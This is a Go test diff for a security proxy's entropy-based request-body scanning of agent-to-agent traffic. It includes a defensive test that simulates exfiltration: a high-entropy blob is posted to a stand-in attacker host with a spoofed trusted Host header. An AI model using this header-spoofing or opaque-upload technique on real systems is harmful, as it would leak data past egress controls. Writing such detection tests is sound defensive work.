@@ -232,7 +232,7 @@ func installForwardTestDialer(p *Proxy, upstreamAddr string) {
 	p.client.Transport = &http.Transport{
 		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
 			switch addr {
-			case "api.example.com:80", "evil.example.com:80":
+			case "api.example.com:80", "evil.example.com:80", "peer.vendor.example:80", "trusted.vendor.example:80":
 				return (&net.Dialer{}).DialContext(ctx, network, upstreamAddr)
 			default:
 				return (&net.Dialer{}).DialContext(ctx, network, addr)
@@ -568,6 +568,200 @@ func TestForwardA2ARequestBodyDirectBlockAfterGenericBodyScanningWarn(t *testing
 	}
 }
 
+func TestForwardA2ARequestBodyContentEntropyBlock(t *testing.T) {
+	var hits atomic.Int32
+	backend := newIPv4Server(t, http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		hits.Add(1)
+		_, _ = w.Write([]byte(`{"jsonrpc":"2.0","id":"req-entropy","result":{"ok":true}}`))
+	}))
+	defer backend.Close()
+
+	proxyAddr, p, cleanup := setupForwardProxyWithInstance(t, func(cfg *config.Config) {
+		cfg.A2AScanning.Enabled = true
+		cfg.A2AScanning.Action = config.ActionWarn
+		cfg.RequestBodyScanning.Enabled = true
+		cfg.RequestBodyScanning.ContentEntropyEnabled = true
+		cfg.RequestBodyScanning.ContentEntropyAction = config.ActionBlock
+		cfg.RequestBodyScanning.ContentEntropyThreshold = 4.5
+		cfg.RequestBodyScanning.ContentEntropyMinLength = 32
+	})
+	defer cleanup()
+	installForwardTestDialer(p, backend.Listener.Addr().String())
+
+	body := `{"jsonrpc":"2.0","id":"req-entropy","method":"message/send","params":{"message":{"messageId":"msg-entropy","role":"user","parts":[{"kind":"data","data":{"blob":"` + opaqueHighEntropyBodyValue() + `"}}]}}}`
+	req, err := http.NewRequestWithContext(t.Context(), http.MethodPost, "http://peer.vendor.example/message:send", strings.NewReader(body))
+	if err != nil {
+		t.Fatalf("NewRequest: %v", err)
+	}
+	req.Header.Set("Content-Type", "application/a2a+json")
+
+	resp, err := forwardHTTPClient(t, proxyAddr).Do(req)
+	if err != nil {
+		t.Fatalf("forward request: %v", err)
+	}
+	defer func() { _ = resp.Body.Close() }()
+
+	if resp.StatusCode != http.StatusForbidden {
+		t.Fatalf("status = %d, want 403", resp.StatusCode)
+	}
+	if got := resp.Header.Get(blockreason.HeaderReason); got != string(blockreason.BodyEntropy) {
+		t.Fatalf("block reason = %q, want %s; layer=%q", got, blockreason.BodyEntropy, resp.Header.Get(blockreason.HeaderLayer))
+	}
+	if hits.Load() != 0 {
+		t.Fatalf("upstream hits = %d, want 0", hits.Load())
+	}
+}
+
+func TestForwardA2ARequestBodyContentEntropyTrustedPeerAllows(t *testing.T) {
+	var gotBody atomic.Value
+	backend := newIPv4Server(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		body, err := io.ReadAll(r.Body)
+		if err != nil {
+			t.Errorf("read upstream body: %v", err)
+			http.Error(w, "bad body", http.StatusBadRequest)
+			return
+		}
+		gotBody.Store(string(body))
+		_, _ = w.Write([]byte(`{"jsonrpc":"2.0","id":"req-entropy-trusted","result":{"ok":true}}`))
+	}))
+	defer backend.Close()
+
+	proxyAddr, p, cleanup := setupForwardProxyWithInstance(t, func(cfg *config.Config) {
+		cfg.A2AScanning.Enabled = true
+		cfg.A2AScanning.Action = config.ActionBlock
+		cfg.TrustedDomains = []string{"trusted.vendor.example"}
+		cfg.RequestBodyScanning.Enabled = true
+		cfg.RequestBodyScanning.ContentEntropyEnabled = true
+		cfg.RequestBodyScanning.ContentEntropyAction = config.ActionBlock
+		cfg.RequestBodyScanning.ContentEntropyThreshold = 4.5
+		cfg.RequestBodyScanning.ContentEntropyMinLength = 32
+	})
+	defer cleanup()
+	installForwardTestDialer(p, backend.Listener.Addr().String())
+
+	body := `{"jsonrpc":"2.0","id":"req-entropy-trusted","method":"message/send","params":{"message":{"messageId":"msg-entropy-trusted","role":"user","parts":[{"kind":"data","data":{"blob":"` + opaqueHighEntropyBodyValue() + `"}}]}}}`
+	req, err := http.NewRequestWithContext(t.Context(), http.MethodPost, "http://trusted.vendor.example/message:send", strings.NewReader(body))
+	if err != nil {
+		t.Fatalf("NewRequest: %v", err)
+	}
+	req.Header.Set("Content-Type", "application/a2a+json")
+
+	resp, err := forwardHTTPClient(t, proxyAddr).Do(req)
+	if err != nil {
+		t.Fatalf("forward request: %v", err)
+	}
+	defer func() { _ = resp.Body.Close() }()
+
+	if resp.StatusCode != http.StatusOK {
+		t.Fatalf("status = %d, want 200", resp.StatusCode)
+	}
+	if got, ok := gotBody.Load().(string); !ok || got != body {
+		t.Fatalf("upstream body = %q, want %q", got, body)
+	}
+}
+
+func TestForwardRequestBodyContentEntropyUsesParsedAuthorityNotHostHeader(t *testing.T) {
+	backend := newIPv4Server(t, http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		_, _ = w.Write([]byte(`{"ok":true}`))
+	}))
+	defer backend.Close()
+
+	proxyAddr, p, cleanup := setupForwardProxyWithInstance(t, func(cfg *config.Config) {
+		cfg.TrustedDomains = []string{"trusted.vendor.example"}
+		cfg.RequestBodyScanning.Enabled = true
+		cfg.RequestBodyScanning.ContentEntropyEnabled = true
+		cfg.RequestBodyScanning.ContentEntropyAction = config.ActionBlock
+		cfg.RequestBodyScanning.ContentEntropyThreshold = 4.5
+		cfg.RequestBodyScanning.ContentEntropyMinLength = 32
+	})
+	defer cleanup()
+	installForwardTestDialer(p, backend.Listener.Addr().String())
+
+	conn, err := (&net.Dialer{Timeout: 2 * time.Second}).DialContext(t.Context(), "tcp", proxyAddr)
+	if err != nil {
+		t.Fatalf("dial proxy: %v", err)
+	}
+	defer func() { _ = conn.Close() }()
+
+	body := fmt.Sprintf(`{"blob":%q}`, opaqueHighEntropyBodyValue())
+	_, _ = fmt.Fprintf(conn, "POST http://evil.example.com/upload HTTP/1.1\r\nHost: trusted.vendor.example\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", len(body), body)
+	resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
+	if err != nil {
+		t.Fatalf("read response: %v", err)
+	}
+	defer func() { _ = resp.Body.Close() }()
+
+	if resp.StatusCode != http.StatusForbidden {
+		t.Fatalf("status = %d, want 403", resp.StatusCode)
+	}
+	if got := resp.Header.Get(blockreason.HeaderReason); got != string(blockreason.BodyEntropy) {
+		t.Fatalf("block reason = %q, want %s; layer=%q", got, blockreason.BodyEntropy, resp.Header.Get(blockreason.HeaderLayer))
+	}
+}
+
+func TestForwardA2ARequestBodyContentEntropyWarnAudits(t *testing.T) {
+	var gotBody atomic.Value
+	backend := newIPv4Server(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		body, err := io.ReadAll(r.Body)
+		if err != nil {
+			t.Errorf("read upstream body: %v", err)
+			http.Error(w, "bad body", http.StatusBadRequest)
+			return
+		}
+		gotBody.Store(string(body))
+		_, _ = w.Write([]byte(`{"jsonrpc":"2.0","id":"req-entropy-warn","result":{"ok":true}}`))
+	}))
+	defer backend.Close()
+
+	proxyAddr, p, cleanup := setupForwardProxyWithInstance(t, func(cfg *config.Config) {
+		cfg.A2AScanning.Enabled = true
+		cfg.A2AScanning.Action = config.ActionBlock
+		cfg.RequestBodyScanning.Enabled = true
+		cfg.RequestBodyScanning.ContentEntropyEnabled = true
+		cfg.RequestBodyScanning.ContentEntropyAction = config.ActionWarn
+		cfg.RequestBodyScanning.ContentEntropyThreshold = 4.5
+		cfg.RequestBodyScanning.ContentEntropyMinLength = 32
+	})
+	defer cleanup()
+	installForwardTestDialer(p, backend.Listener.Addr().String())
+
+	auditPath := filepath.Join(t.TempDir(), "audit.jsonl")
+	logger, err := audit.New("json", "file", auditPath, false, false)
+	if err != nil {
+		t.Fatalf("audit.New: %v", err)
+	}
+	p.logger = logger
+
+	body := `{"jsonrpc":"2.0","id":"req-entropy-warn","method":"message/send","params":{"message":{"messageId":"msg-entropy-warn","role":"user","parts":[{"kind":"data","data":{"blob":"` + opaqueHighEntropyBodyValue() + `"}}]}}}`
+	req, err := http.NewRequestWithContext(t.Context(), http.MethodPost, "http://peer.vendor.example/message:send", strings.NewReader(body))
+	if err != nil {
+		t.Fatalf("NewRequest: %v", err)
+	}
+	req.Header.Set("Content-Type", "application/a2a+json")
+
+	resp, err := forwardHTTPClient(t, proxyAddr).Do(req)
+	if err != nil {
+		t.Fatalf("forward request: %v", err)
+	}
+	defer func() { _ = resp.Body.Close() }()
+
+	if resp.StatusCode != http.StatusOK {
+		t.Fatalf("status = %d, want 200", resp.StatusCode)
+	}
+	if got, ok := gotBody.Load().(string); !ok || got != body {
+		t.Fatalf("upstream body = %q, want %q", got, body)
+	}
+	logger.Close()
+	logBytes, err := os.ReadFile(filepath.Clean(auditPath))
+	if err != nil {
+		t.Fatalf("read audit log: %v", err)
+	}
+	logText := string(logBytes)
+	if !strings.Contains(logText, `"event":"body_entropy"`) || !strings.Contains(logText, `"action":"warn"`) {
+		t.Fatalf("expected body_entropy warn audit event, got:\n%s", logText)
+	}
+}
+
 func TestForwardA2ARequestBodyForwardedWithGenericBodyScanningDisabled(t *testing.T) {
 	var gotBody atomic.Value
 	backend := newIPv4Server(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
@@ -806,6 +1000,13 @@ func TestA2ABodyBlockReason(t *testing.T) {
 			want: blockreason.DLPMatch,
 		},
 		{
+			name: "content entropy",
+			result: mcp.A2AScanResult{
+				EntropyFinding: &ContentEntropyFinding{Entropy: 5.1, Threshold: 4.5, Length: 64},
+			},
+			want: blockreason.BodyEntropy,
+		},
+		{
 			name:   "parser fallback",
 			result: mcp.A2AScanResult{Reason: "a2a: invalid JSON: empty body"},
 			want:   blockreason.ParseError,
@@ -817,6 +1018,13 @@ func TestA2ABodyBlockReason(t *testing.T) {
 				t.Fatalf("reason = %s, want %s", got, tt.want)
 			}
 		})
+	}
+}
+
+func TestA2AContentEntropyOptionsNilConfig(t *testing.T) {
+	opts := a2aContentEntropyOptions("peer.vendor.example", nil)
+	if opts.Enabled || opts.Action != "" || opts.Threshold != 0 || opts.MinLength != 0 {
+		t.Fatalf("nil config options = %+v, want zero value", opts)
 	}
 }
 
